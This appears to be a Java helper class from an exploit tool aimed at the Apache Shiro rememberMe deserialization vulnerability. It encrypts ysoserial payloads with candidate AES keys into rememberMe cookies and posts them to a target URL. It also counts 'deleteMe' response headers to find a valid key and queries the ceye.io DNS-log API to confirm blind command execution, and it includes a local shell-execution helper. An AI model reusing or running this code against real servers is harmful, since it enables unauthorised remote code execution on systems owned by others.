package com.madao.jvav.util;


import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.util.Base64Utils;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;


public class Function {

    private static String osName;

    public static void setOsName(String name) {
        osName = name;
    }

    public static String getOsName() {
        return osName;
    }

    /*
    * 调用 cmd 执行命令
    * 以 byte[] 形式返回执行结果
    *
    *@Param----String command ##命令
    *@Return----byte[] ##命令执行结果
    * */
    public static byte[] getExecByte(String command) throws IOException {

        String[] cmd = null;
        if (osName.equals("Windows")) {
            cmd = new String[]{"cmd", "/C", command};
        } else {
            cmd = new String[]{"/bin/bash", "-c", command};
        }

        Process process = Runtime.getRuntime().exec(cmd);
        InputStream is = process.getInputStream();
        byte[] b = new byte[1000];
        int a = 0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while ( (a = is.read(b) )!= -1) {
            baos.write(b,0, a);
        }
        byte[] payloadByte = baos.toByteArray();
        return payloadByte;
    }

    /*
    * AES加密获取 rememberMeCookie
    *
    *
    *@Param----String key ##加密用到的key,base64字符串
    *@Param----byte[] payloadByte ##yso得到的payload
    *@Return----String ##rememberMe cookie
    * */
    public static String getRememberMeCookie(byte[] payloadByte, String key) {
        AesCipherService aes = new AesCipherService();
        byte[] keyByte = Base64Utils.decodeFromString(key);
        ByteSource source = aes.encrypt(payloadByte, keyByte);
        String rememberMeCookie = source.toString();
        return rememberMeCookie;
    }

    /*
    * 向目标发起请求，获取rememberMe=deleteMe 数量
    *
    * @Param----String url（目标url）
    * @Param----String rememberMeCookie （rememberMe）
    * @Return----int （响应中rememberMe=deleteMe的数量)
    * */
    public static int getDeleteMeCount(String url, String rememberMeCookie) {
        Map body = new HashMap();
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.set("Cookie", "JSESSIONID=madao;rememberMe="+rememberMeCookie+ ";");
        HttpEntity httpEntity = new HttpEntity<>(body, reqHeaders);
        RestTemplate restTemplate = new RestTemplate();
        HttpEntity<String> resp = restTemplate.exchange(url, HttpMethod.POST, httpEntity, String.class);

        HttpHeaders respHeaders = resp.getHeaders();
        int count = 0;
        try {
            for (String i : respHeaders.get("Set-Cookie")) {
                if ( i.contains("rememberMe=deleteMe") ) {
                    count++;
                }
            }
            return count;
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    public static void sendToTarget(String url, String rememberMeCookie) {
        Map body = new HashMap();
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.set("Cookie", "JSESSIONID=madao;rememberMe="+rememberMeCookie+ ";");
        HttpEntity httpEntity = new HttpEntity<>(body, reqHeaders);
        RestTemplate restTemplate = new RestTemplate();
        restTemplate.exchange(url, HttpMethod.POST, httpEntity, String.class);
    }

    /*
    * 获取随机 id
    * */
    public static String randomId() {
        String base = "qwertyuiopasdfghjklzxcvbnm0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i=0; i<4; i++) {
            int number = random.nextInt(base.length());
            sb.append(base.charAt(number));
        }
        return sb.toString();
    }

    /*
    * 获取 ceye 结果
    * 返回，结果的长度
    * */
    public static int ceyeRespDataLen(String randomId, String token) throws JSONException {
        String url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + randomId;

        RestTemplate restTemplate = new RestTemplate();
        String ceyeResp = restTemplate.getForObject(url, String.class);

        JSONObject jsonObject = new JSONObject(ceyeResp);
        JSONArray jsonArray = jsonObject.getJSONArray("data");
        return jsonArray.length();
    }

    /*

     */
    public static void ceyeRespData(String randomId, String token) throws JSONException {
        String url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + randomId;

        RestTemplate restTemplate = new RestTemplate();
        String ceyeResp = restTemplate.getForObject(url, String.class);

        JSONObject jsonObject = new JSONObject(ceyeResp);

    }


}
